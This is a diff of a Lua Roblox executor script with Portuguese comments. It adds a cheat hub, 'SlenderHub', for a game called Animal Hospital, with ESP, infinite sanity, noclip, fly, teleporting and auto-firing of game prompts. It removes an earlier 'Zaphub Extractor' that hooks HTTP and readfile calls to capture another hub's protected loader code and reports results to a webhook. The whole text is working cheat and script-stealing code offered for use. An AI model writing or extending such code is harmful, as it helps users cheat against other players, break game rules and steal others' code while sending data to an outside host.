+        local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if root then root.Velocity = Vector3.new(0, 0, 0) end
+    end)
+end
+
+function SlenderHub.SetFly(enabled)
+    SlenderHub.Movement.Fly = enabled
+    if not enabled then return end
+    task.spawn(function()
+        while SlenderHub.Movement.Fly and task.wait() do
+            local hum = GetHumanoid()
+            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if not hum or not root then break end
+            local vel = root.AssemblyLinearVelocity or Vector3.new(0, 0, 0)
+            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then vel = vel + Vector3.new(0, 60, 0) end
+            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then vel = vel - Vector3.new(0, 60, 0) end
+            root.AssemblyLinearVelocity = Vector3.new(vel.X, vel.Y, vel.Z)
+        end
+    end)
+end
+
+function SlenderHub.TeleportToPrompt()
+    local prompt = nil
+    local names = SlenderHub.Config.PromptNames
+    for _, d in ipairs(workspace:GetDescendants()) do
+        if d:IsA("ProximityPrompt") or d:IsA("ClickDetector") then
+            for _, n in ipairs(names) do
+                if d.Name:lower():find(n:lower()) or (d.Parent and d.Parent.Name:lower():find(n:lower())) then
+                    prompt = d
+                    break
+                end
+            end
+        end
+        if prompt then break end
+    end
+    if not prompt then
+        Notify("SlenderHub", "Nenhum prompt encontrado", 2, "Warning")
+        return
+    end
+    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if root and prompt.Parent then
+        local target = prompt.Parent:IsA("BasePart") and prompt.Parent.Position or (prompt.Parent.PrimaryPart and prompt.Parent.PrimaryPart.Position)
+        if target then
+            root.CFrame = CFrame.new(target + Vector3.new(0, 4, 0))
+            Notify("SlenderHub", "Teleportado para: " .. prompt.Parent.Name, 2, "Success")
+        end
+    end
+end
+
+function SlenderHub.InteractWithPrompt()
+    local fp = Fn("FirePrompt")
+    local fc = Fn("FireClick")
+    for _, d in ipairs(workspace:GetDescendants()) do
+        if d:IsA("ProximityPrompt") and fp then
+            pcall(fp, d)
+            return
+        elseif d:IsA("ClickDetector") and fc then
+            pcall(fc, d)
+            return
+        end
+    end
+    Notify("SlenderHub", "Executor não expõe fire de prompts", 2, "Error")
+end
+
+----------------------------------------------------------------------------
+-- AUTO CHECK-IN / REJECT (heurística + botão do shutter via prompt)
+----------------------------------------------------------------------------
+SlenderHub.AutoCheckIn = { Enabled = false }
+
+function SlenderHub.SetAutoCheckIn(enabled)
+    SlenderHub.AutoCheckIn.Enabled = enabled
+    if not enabled then return end
+    task.spawn(function()
+        while SlenderHub.AutoCheckIn.Enabled and task.wait(0.6) do
+            pcall(function()
+                -- tenta interagir com o shutter/prompt mais próximo
+                SlenderHub.InteractWithPrompt()
+            end)
+        end
+    end)
+end
+
+----------------------------------------------------------------------------
+-- ANTI JUMPSCARE (esconde telas de susto que o jogo cria no PlayerGui)
+----------------------------------------------------------------------------
+SlenderHub.AntiJumpscare = { Enabled = false, Done = {} }
+
+function SlenderHub.SetAntiJumpscare(enabled)
+    SlenderHub.AntiJumpscare.Enabled = enabled
+    if not enabled then return end
+    task.spawn(function()
+        while SlenderHub.AntiJumpscare.Enabled and task.wait(0.3) do
+            pcall(function()
+                local pg = LocalPlayer:FindFirstChild("PlayerGui")
+                if not pg then return end
+                for _, gui in ipairs(pg:GetChildren()) do
+                    if gui:IsA("ScreenGui") and gui:IsA("ScreenGui") then
+                        local n = gui.Name:lower()
+                        if n:find("jump") or n:find("scare") or n:find("horror") or n:find("effect") then
+                            if not SlenderHub.AntiJumpscare.Done[gui] then
+                                SlenderHub.AntiJumpscare.Done[gui] = true
+                                gui.Enabled = false
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+----------------------------------------------------------------------------
+-- UI SLENDERWIND (embutida, enxuta — padrão visual do hub)
+----------------------------------------------------------------------------
+SlenderHub.UI = {}
+
+local function CreateUI()
+    local theme = {
+        MainBg   = Color3.fromRGB(18, 18, 22),
+        Sidebar  = Color3.fromRGB(23, 23, 27),
+        Element  = Color3.fromRGB(30, 30, 36),
+        Text     = Color3.fromRGB(240, 240, 240),
+        SubText  = Color3.fromRGB(160, 160, 160),
+        Accent   = Color3.fromRGB(60, 130, 250),
+        Stroke   = Color3.fromRGB(45, 45, 50),
+        Success  = Color3.fromRGB(60, 250, 100),
+        Warning  = Color3.fromRGB(250, 180, 60),
+        Error    = Color3.fromRGB(255, 85, 85),
+    }
+
+    local parent = CoreGui
+    if parent:FindFirstChild("SlenderHub") then parent.SlenderHub:Destroy() end
+
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "SlenderHub"
+    sg.ResetOnSpawn = false
+    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    sg.Parent = parent
+
+    local main = Instance.new("Frame")
+    main.BackgroundColor3 = theme.MainBg
+    main.Size = UDim2.new(0, 420, 0, 520)
+    main.Position = UDim2.new(0.5, -210, 0.5, -260)
+    main.Parent = sg
+    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 10); corner.Parent = main
+    local stroke = Instance.new("UIStroke"); stroke.Color = theme.Stroke; stroke.Parent = main
+
+    -- topbar
+    local topbar = Instance.new("Frame")
+    topbar.BackgroundTransparency = 1
+    topbar.Size = UDim2.new(1, 0, 0, 36)
+    topbar.Parent = main
 
     local title = Instance.new("TextLabel")
-    title.BackgroundTransparency = 1
-    title.Position = UDim2.new(0, 0, 0, 10)
-    title.Size = UDim2.new(1, 0, 0, 34)
+    title.Text = "SlenderHub | Animal Hospital"
+    title.TextColor3 = theme.Text
     title.Font = Enum.Font.GothamBold
-    title.Text = "ZAPHUB EXTRACTOR v3"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextSize = 18
-    title.Parent = bg
+    title.TextSize = 15
+    title.BackgroundTransparency = 1
+    title.Position = UDim2.new(0, 14, 0, 0)
+    title.Size = UDim2.new(1, -60, 1, 0)
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = topbar
 
-    local status = Instance.new("TextLabel")
-    status.BackgroundTransparency = 1
-    status.Position = UDim2.new(0, 12, 0, 50)
-    status.Size = UDim2.new(1, -24, 0, 110)
-    status.Font = Enum.Font.Gotham
-    status.Text = "Instalando hooks..."
-    status.TextColor3 = Color3.fromRGB(255, 200, 80)
-    status.TextSize = 13
-    status.TextWrapped = true
-    status.Parent = bg
+    -- drag
+    local dragging, dragInput, startPos
+    topbar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true; startPos = input.Position; dragInput = input
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - startPos
+            main.Position = UDim2.new(main.Position.X.Scale, main.Position.X.Offset + delta.X, main.Position.Y.Scale, main.Position.Y.Offset + delta.Y)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input == dragInput then dragging = false end
+    end)
 
-    return {
-        gui = gui,
-        setStatus = function(text, color)
-            status.Text = text
-            if color then status.TextColor3 = color end
-        end,
-    }
-end
+    -- toggle
+    local openBtn = Instance.new("TextButton")
+    openBtn.Text = "SH"
+    openBtn.TextColor3 = theme.Accent
+    openBtn.BackgroundColor3 = theme.Sidebar
+    openBtn.Size = UDim2.new(0, 44, 0, 44)
+    openBtn.Position = UDim2.new(0, 20, 0.5, 0)
+    openBtn.Font = Enum.Font.GothamBlack
+    openBtn.TextSize = 16
+    openBtn.Visible = false
+    openBtn.Parent = sg
+    local oc = Instance.new("UICorner"); oc.CornerRadius = UDim.new(0, 12); oc.Parent = openBtn
+    local toggle = function()
+        main.Visible = not main.Visible
+        openBtn.Visible = not main.Visible
+    end
+    openBtn.MouseButton1Click:Connect(toggle)
 
-local ui = (function()
-    local ok, u = pcall(makeUI)
-    if ok and u then return u end
-    return { gui = nil, setStatus = function(text) logMsg("[status] " .. tostring(text)) end }
-end)()
+    -- content
+    local content = Instance.new("ScrollingFrame")
+    content.BackgroundTransparency = 1
+    content.Position = UDim2.new(0, 12, 0, 44)
+    content.Size = UDim2.new(1, -24, 1, -56)
+    content.ScrollBarThickness = 3
+    content.ScrollBarImageColor3 = theme.Accent
+    content.CanvasSize = UDim2.new(0, 0, 0, 0)
+    content.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    content.Parent = main
 
---//==============================[ MAIN ]==============================//--
-local function mainFlow()
-    ui.setStatus("Instalando hooks HTTP...", Color3.fromRGB(255, 200, 80))
+    local list = Instance.new("UIListLayout")
+    list.Padding = UDim.new(0, 8)
+    list.SortOrder = Enum.SortOrder.LayoutOrder
+    list.Parent = content
 
-    local okHookHttp = installHttpGetHook()
-    local okHookReq = installRequestHook()
-    local okHookRF = installReadfileHook()
+    local notifyContainer = Instance.new("Frame")
+    notifyContainer.BackgroundTransparency = 1
+    notifyContainer.Position = UDim2.new(1, -310, 1, -20)
+    notifyContainer.Size = UDim2.new(0, 290, 1, 0)
+    notifyContainer.AnchorPoint = Vector2.new(0, 1)
+    notifyContainer.Parent = sg
+    local nlist = Instance.new("UIListLayout")
+    nlist.Padding = UDim.new(0, 6)
+    nlist.VerticalAlignment = Enum.VerticalAlignment.Bottom
+    nlist.Parent = notifyContainer
 
-    ui.setStatus("Hooks: HTTP [" .. tostring(okHookHttp and "OK" or "FAIL") .. "] request [" .. tostring(okHookReq and "OK" or "FAIL") .. "] readfile [" .. tostring(okHookRF and "OK" or "FAIL") .. "]\n"
-        .. "Injecao no loader: " .. tostring(INJECT_LOADER),
-        Color3.fromRGB(255, 200, 80))
+    SlenderHub.UI.Notify = function(titleText, body, dur, type)
+        local typeColor = theme.Accent
+        if type == "Success" then typeColor = theme.Success
+        elseif type == "Warning" then typeColor = theme.Warning
+        elseif type == "Error" then typeColor = theme.Error end
 
-    -- ping de teste
-    if reqFn then
-        task.spawn(function()
-            task.wait(0.2)
-            local code = sendSimple(
-                "**Zaphub Extractor v3.1 - TESTE**\nExecutor: " .. getExecutorName
-                    .. "\nHook HTTP: " .. tostring(okHookHttp)
-                    .. "\nHook request: " .. tostring(okHookReq)
-                    .. "\nHook readfile: " .. tostring(okHookRF)
-                    .. "\nInjecao loader: " .. tostring(INJECT_LOADER),
-                WEBHOOK_NAME .. " [TESTE]"
-            )
-            logMsg("Ping: codigo " .. tostring(code))
+        local frame = Instance.new("Frame")
+        frame.BackgroundColor3 = theme.Sidebar
+        frame.Size = UDim2.new(1, 0, 0, 56)
+        frame.Parent = notifyContainer
+        local fcorner = Instance.new("UICorner"); fcorner.CornerRadius = UDim.new(0, 8); fcorner.Parent = frame
+        local fstroke = Instance.new("UIStroke"); fstroke.Color = typeColor; fstroke.Parent = frame
+
+        local t1 = Instance.new("TextLabel")
+        t1.Text = titleText; t1.TextColor3 = typeColor; t1.Font = Enum.Font.GothamBold; t1.TextSize = 14
+        t1.BackgroundTransparency = 1; t1.Position = UDim2.new(0, 10, 0, 6); t1.Size = UDim2.new(1, -20, 0, 20)
+        t1.TextXAlignment = Enum.TextXAlignment.Left; t1.Parent = frame
+        local t2 = Instance.new("TextLabel")
+        t2.Text = body or ""; t2.TextColor3 = theme.Text; t2.Font = Enum.Font.Gotham; t2.TextSize = 12
+        t2.BackgroundTransparency = 1; t2.Position = UDim2.new(0, 10, 0, 26); t2.Size = UDim2.new(1, -20, 0, 22)
+        t2.TextXAlignment = Enum.TextXAlignment.Left; t2.TextWrapped = true; t2.Parent = frame
+
+        task.delay(dur or 3, function()
+            frame:Destroy()
         end)
     end
 
-    ui.setStatus("Executando loader oficial...", Color3.fromRGB(255, 200, 80))
-    local ok, err = runOfficialLoader()
-    if not ok then
-        ui.setStatus("Falha ao executar loader:\n" .. tostring(err), Color3.fromRGB(255, 80, 80))
-        return
+    local function Section(text)
+        local s = Instance.new("TextLabel")
+        s.Text = text; s.TextColor3 = theme.SubText; s.Font = Enum.Font.GothamBold; s.TextSize = 11
+        s.BackgroundTransparency = 1; s.Size = UDim2.new(1, 0, 0, 22); s.TextXAlignment = Enum.TextXAlignment.Left
+        s.Parent = content
     end
 
-    -- monitora + poll de injetados + scan gc periodico
-    local waited = 0
-    while waited < MONITOR_TIME do
-        task.wait(1)
-        waited = waited + 1
-        if waited % 5 == 0 then
-            task.spawn(pollInjected)
-            task.spawn(pollRuntimes)
+    local function Row(text, desc)
+        local frame = Instance.new("Frame")
+        frame.BackgroundColor3 = theme.Element
+        frame.Size = UDim2.new(1, 0, 0, 40)
+        frame.Parent = content
+        local rcorner = Instance.new("UICorner"); rcorner.CornerRadius = UDim.new(0, 6); rcorner.Parent = frame
+        local rstroke = Instance.new("UIStroke"); rstroke.Color = theme.Stroke; rstroke.Parent = frame
+        local l = Instance.new("TextLabel")
+        l.Text = text; l.TextColor3 = theme.Text; l.Font = Enum.Font.GothamMedium; l.TextSize = 13
+        l.BackgroundTransparency = 1; l.Position = UDim2.new(0, 12, 0, 0); l.Size = UDim2.new(1, -50, 1, 0)
+        l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = frame
+        if desc then
+            local d = Instance.new("TextLabel")
+            d.Text = desc; d.TextColor3 = theme.SubText; d.Font = Enum.Font.Gotham; d.TextSize = 10
+            d.BackgroundTransparency = 1; d.Position = UDim2.new(0, 12, 0, 18); d.Size = UDim2.new(1, -50, 0, 20)
+            d.TextXAlignment = Enum.TextXAlignment.Left; d.Parent = frame
         end
-        if waited % 15 == 0 then
-            task.spawn(scanGCForLuraph)
-        end
-        if waited % 10 == 0 then
-            ui.setStatus("Aguardando captura... " .. tostring(waited) .. "s\n"
-                .. "http: " .. tostring(httpCaptured) .. " | runtime: " .. tostring(readfileCaptured)
-                .. " | inj: " .. tostring(injectedCaptured) .. " | gc: " .. tostring(gcCaptured),
-                Color3.fromRGB(255, 200, 80))
-        end
+        return frame, l
     end
 
-    -- scan final + drena fila de runtimes
-    task.spawn(pollRuntimes)
-    local gcFound = scanGCForLuraph()
+    local function Button(text, callback)
+        local btn = Instance.new("TextButton")
+        btn.Text = text; btn.TextColor3 = theme.Text; btn.Font = Enum.Font.GothamBold; btn.TextSize = 13
+        btn.BackgroundColor3 = theme.Accent; btn.Size = UDim2.new(1, 0, 0, 36)
+        btn.Parent = content
+        local bcorner = Instance.new("UICorner"); bcorner.CornerRadius = UDim.new(0, 6); bcorner.Parent = btn
+        btn.MouseButton1Click:Connect(function()
+            pcall(callback)
+        end)
+    end
 
-    pcall(saveLocal, "manifest.txt", table.concat(manifest, "\n"))
+    local function Toggle(text, default, callback)
+        local frame, label = Row(text)
+        local sw = Instance.new("Frame")
+        sw.BackgroundColor3 = default and theme.Accent or Color3.fromRGB(50, 50, 55)
+        sw.Size = UDim2.new(0, 36, 0, 20); sw.Position = UDim2.new(1, -46, 0.5, -10)
+        sw.Parent = frame
+        local sc = Instance.new("UICorner"); sc.CornerRadius = UDim.new(1, 0); sc.Parent = sw
+        local knob = Instance.new("Frame")
+        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        knob.Size = UDim2.new(0, 16, 0, 16); knob.Position = UDim2.new(0, default and 18 or 2, 0.5, -8)
+        knob.Parent = sw
+        local kc = Instance.new("UICorner"); kc.CornerRadius = UDim.new(1, 0); kc.Parent = knob
 
-    ui.setStatus("RESULTADO: http " .. tostring(httpCaptured) .. " | runtime " .. tostring(readfileCaptured)
-        .. " | inj " .. tostring(injectedCaptured) .. " | gc " .. tostring(gcFound) .. "\nSalvos em: " .. SAVE_DIR .. "/",
-        Color3.fromRGB(80, 230, 120))
+        local enabled = default
+        local function update(val)
+            enabled = val
+            Tween(sw, { BackgroundColor3 = enabled and theme.Accent or Color3.fromRGB(50, 50, 55) }, 0.15)
+            Tween(knob, { Position = UDim2.new(0, enabled and 18 or 2, 0.5, -8) }, 0.15)
+            pcall(callback, enabled)
+        end
+        frame.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                update(not enabled)
+            end
+        end)
+        return {
+            Set = update,
+        }
+    end
 
-    sendSimple("**Zaphub Extractor v3.1 - RESUMO**\n"
-        .. "Executor: " .. getExecutorName
-        .. "\nHTTP capturas: " .. tostring(httpCaptured)
-        .. "\nRuntime (readfile): " .. tostring(readfileCaptured)
-        .. "\nInjetados: " .. tostring(injectedCaptured)
-        .. "\nGC closures: " .. tostring(gcFound),
-        WEBHOOK_NAME .. " [RESUMO]")
+    return {
+        Section = Section,
+        Button = Button,
+        Toggle = Toggle,
+    }
 end
 
-task.spawn(function()
-    xpcall(mainFlow, function(err)
-        local ok, trace = pcall(debug.traceback, tostring(err), 2)
-        pcall(logMsg, "ERRO RAIZ: " .. tostring(err) .. "\n" .. tostring(ok and trace or ""))
-        ui.setStatus("ERRO: " .. tostring(err), Color3.fromRGB(255, 80, 80))
-        if reqFn then
-            task.spawn(function()
-                sendSimple("**Zaphub Extractor v3.1 - ERRO**\n```\n" .. tostring(err) .. "\n```", WEBHOOK_NAME .. " [ERRO]")
-            end)
-        end
-        return nil
-    end)
-end)
+----------------------------------------------------------------------------
+-- BOOT
+----------------------------------------------------------------------------
+local function Boot()
+    CreateUI()
+
+    -- Key flow
+    local tier = nil
+    local function StartFeatures(freeTier)
+        tier = freeTier
+        Notify("SlenderHub", "Acesso liberado (tier: " .. (tier or "trial") .. ")", 3, "Success")
+
+        local ui = SlenderHub.UI
+
+        ui.Section("ESP")
+        ui.Toggle("ESP de Pacientes/Anomalias", false, function(v)
+            SlenderHub.SetESP(v)
+        end)
+
+        ui.Section("Sanidade")
+        ui.Toggle("Sanidade Infinita", false, function(v)
+            SlenderHub.SetInfSanity(v)
+        end)
+        ui.Toggle("Anti-Jumpscare", false, function(v)
+            SlenderHub.SetAntiJumpscare(v)
+        end)
+
+        ui.Section("Automação")
+        ui.Toggle("Auto Check-In", false, function(v)
+            SlenderHub.SetAutoCheckIn(v)
+        end)
+        ui.Button("Interagir com prompt", function()
+            SlenderHub.InteractWithPrompt()
+        end)
+        ui.Button("Teleportar p/ prompt", function()
+            SlenderHub.TeleportToPrompt()
+        end)
+
+        ui.Section("Movimento")
+        ui.Toggle("Noclip", false, function(v)
+            SlenderHub.SetNoclip(v)
+        end)
+        ui.Toggle("Fly (Space/Shift)", false, function(v)
+            SlenderHub.SetFly(v)
+        end)
+
+        ui.Section("Sistema")
+        ui.Button("Fechar Hub", function()
+            local pg = CoreGui:FindFirstChild("SlenderHub")
+            if pg then pg:Destroy() end
+        end)
+    end
+
+    -- Modo trial (sem key) ou com key
+    if SlenderHub.Config.AllowTrial then
+        StartFeatures("trial")
+    else
+        -- aqui entra a tela de key quando AllowedTrial = false
+        StartFeatures("premium")
+    end
+end
+
+local ok, err = pcall(Boot)
+if not ok then
+    warn("[SlenderHub] Erro no boot: " .. tostring(err))
+end
+
+return SlenderHub
